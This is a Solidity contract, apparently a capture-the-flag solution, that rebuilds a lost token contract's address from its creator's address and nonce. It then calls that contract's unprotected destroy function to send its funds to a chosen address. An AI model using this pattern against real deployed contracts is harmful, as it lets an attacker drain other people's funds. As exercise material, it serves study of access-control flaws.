// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface SimpleToken{
    function destroy(address payable _to) external;
}

contract HackSimpleToken {
    SimpleToken simpleToken;

//derived = rightmost20 bytes(keccak(RLP(sender_address, nonce)))
// ("0xd6", "0x94",  _tokenAddress, "0x01")
//let hackaddress = web3.utils.soliditySha3("0xd6", "0x94", instance, "0x01")
//let hack2 = hackaddress.slice(26)

    constructor(address _derivedAddress) public {
        simpleToken = SimpleToken(_derivedAddress);
    }

    function attack(address payable _to) public {
        simpleToken.destroy(_to);
    }
}
